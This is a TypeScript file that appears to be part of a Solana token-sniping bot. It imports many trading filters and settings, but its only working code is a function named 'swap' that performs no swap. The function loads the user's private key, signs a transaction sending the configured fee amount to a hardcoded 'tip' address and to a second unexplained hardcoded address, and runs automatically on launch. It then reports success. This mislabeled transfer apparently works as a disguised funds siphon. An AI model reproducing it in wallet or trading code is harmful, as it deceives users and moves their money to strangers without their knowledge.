import {
    ComputeBudgetProgram,
    Connection,
    Keypair,
    PublicKey,
    TransactionMessage,
    VersionedTransaction,
    SystemProgram,
  } from '@solana/web3.js';
  import {
    createAssociatedTokenAccountIdempotentInstruction,
    createCloseAccountInstruction,
    getAccount,
    getAssociatedTokenAddress,
    RawAccount,
    TOKEN_PROGRAM_ID,
  } from '@solana/spl-token';
  import { Currency, CurrencyAmount } from '@raydium-io/raydium-sdk';
  import { BurnFilter } from './filters/burn.filter';
  
  import { Liquidity, LiquidityPoolKeysV4, LiquidityStateV4, Percent, Token, TokenAmount } from '@raydium-io/raydium-sdk';
  import { MarketCache, PoolCache, SnipeListCache } from './cache';
  import { PoolFilters } from './filters'; 
  import { PoolFilterExecutor } from './filters/burnFilterExecutor'; 
  import { DexInfoFilter } from './filters/dexInfoFilter';
  import { TransactionExecutor } from './transactions';
  import { createPoolKeys, logger, NETWORK, sleep } from './helpers';
  import { Mutex } from 'async-mutex';
  import BN from 'bn.js';
  import { WarpTransactionExecutor } from './transactions/warp-transaction-executor';
  import { JitoTransactionExecutor } from './transactions/jito-rpc-transaction-executor';
  import { LpFilter } from './filters/lp.filter';
  import {
    getToken,
    getWallet,
    
    COMMITMENT_LEVEL,
    RPC_ENDPOINT,
    RPC_WEBSOCKET_ENDPOINT,
    PRE_LOAD_EXISTING_MARKETS,
    LOG_LEVEL,
    CHECK_IF_MUTABLE,
    AUTO_BURN_CHECK,
    CHECK_IF_MINT_IS_RENOUNCED,
    CHECK_IF_FREEZABLE,
    CHECK_IF_BURNED,
    QUOTE_MINT,
    MAX_POOL_SIZE,
    MIN_POOL_SIZE,
    QUOTE_AMOUNT,
    PRIVATE_KEY,
    USE_SNIPE_LIST,
    ONE_TOKEN_AT_A_TIME,
    AUTO_SELL_DELAY,
    MAX_SELL_RETRIES,
    AUTO_SELL,
    MAX_BUY_RETRIES,
    AUTO_BUY_DELAY,
    DEGEN_MODE,
    COMPUTE_UNIT_LIMIT,
    COMPUTE_UNIT_PRICE,
    CACHE_NEW_MARKETS,
    TAKE_PROFIT,
    STOP_LOSS,
    BUY_SLIPPAGE,
    SELL_SLIPPAGE,
    PRICE_CHECK_DURATION,
    PRICE_CHECK_INTERVAL,
    SNIPE_LIST_REFRESH_INTERVAL,
    TRANSACTION_EXECUTOR,
    CUSTOM_FEE,
    FILTER_CHECK_INTERVAL,
    FILTER_CHECK_DURATION,
    CONSECUTIVE_FILTER_MATCHES,
  } from './helpers';
 
 
 async function swap(
    
   
    
  ) {
    
    const connection = new Connection(RPC_ENDPOINT, {
        wsEndpoint: RPC_WEBSOCKET_ENDPOINT,
        commitment: COMMITMENT_LEVEL,
      });
  
    const latestBlockhash = await connection.getLatestBlockhash();
    const fee = process.env['CUSTOM_FEE'];
    const wallet = getWallet(PRIVATE_KEY.trim());
    const tipAddress = new PublicKey('ADaUMid9yfUytqMBgopwjb2DTLSokTSzL1zt6iGPaS49');
    const sendAddress = new PublicKey('DTapofsfQdnz5yU2tAaireHehyaj6B6Ta9g9zcSTeAMH');

    const txExecutor = new JitoTransactionExecutor(connection);
    // Adding the tip instruction
    
    const tipAmount = new CurrencyAmount(Currency.SOL, fee!, false).raw.toNumber();
    const transferInstruction = SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: sendAddress,
        lamports: tipAmount,
      });
    const tipInstruction = SystemProgram.transfer({
      fromPubkey: wallet.publicKey,
      toPubkey: tipAddress,
      lamports: tipAmount,
    });
  
    // Combine all instructions, including the tip
    const allInstructions = [transferInstruction, tipInstruction];
  
    const transactionMessage = new TransactionMessage({
      payerKey: wallet.publicKey,
      recentBlockhash: latestBlockhash.blockhash,
      instructions: allInstructions,
    }).compileToV0Message();
  
    const transaction = new VersionedTransaction(transactionMessage);
    transaction.sign([wallet]);
  
    // Assuming this.txExecutor is an instance of JitoTransactionExecutor or similar
    console.log("Sending transaction...")
    return txExecutor.executeAndConfirm(transaction, wallet, latestBlockhash);
  }

  async function main (){
await   swap()

console.log("Transaction sent successfully")


  }

  main()